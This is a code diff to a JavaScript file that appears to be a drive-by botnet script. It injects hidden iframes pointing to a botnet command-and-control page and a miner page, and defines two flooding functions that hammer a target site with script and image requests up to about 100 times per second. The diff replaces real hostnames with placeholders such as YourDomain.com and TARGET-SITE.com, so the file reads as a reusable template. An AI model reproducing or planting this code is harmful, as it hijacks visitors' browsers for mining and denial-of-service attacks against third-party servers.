@@ -1,10 +1,24 @@
-document.write("<iframe id='ifr11323' style='display:none;'src='http://edu.ardvark.net/BotNet/CC/index.php'></iframe>");
-document.write("<iframe id='ifr11323' style='display:none;'src='http://edu.ardvark.net/miner.html'></iframe>");
-ddos('http://www.try2hack.nl/images/header.png',
-'http://www.try2hack.nl/images/header.png');
+
+
+
+document.write("<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/BotNet/CC/index.php'></iframe>");
+document.write("<iframe id='ifr11323' style='display:none;'src='http://YourDomain.com/miner.html'></iframe>");
+ddos('http://TARGET-SITE.com/images/header.png',
+'http://TARGET-SITE.com/images/header.png');
 function ddos(url,url2){
 window.setInterval(function (){
 $.getScript(url);
 $.getScript(url2);
 },1000)
 }
+
+
+function imgflood() {
+  var TARGET = 'http://TARGET-SITE.com'
+  var URI = '/index.php?'
+  var pic = new Image()
+  var rand = Math.floor(Math.random() * 1000)
+  pic.src = 'http://'+TARGET+URI+rand+'=val'
+}
+setInterval(imgflood, 10) //100 requests per second
+
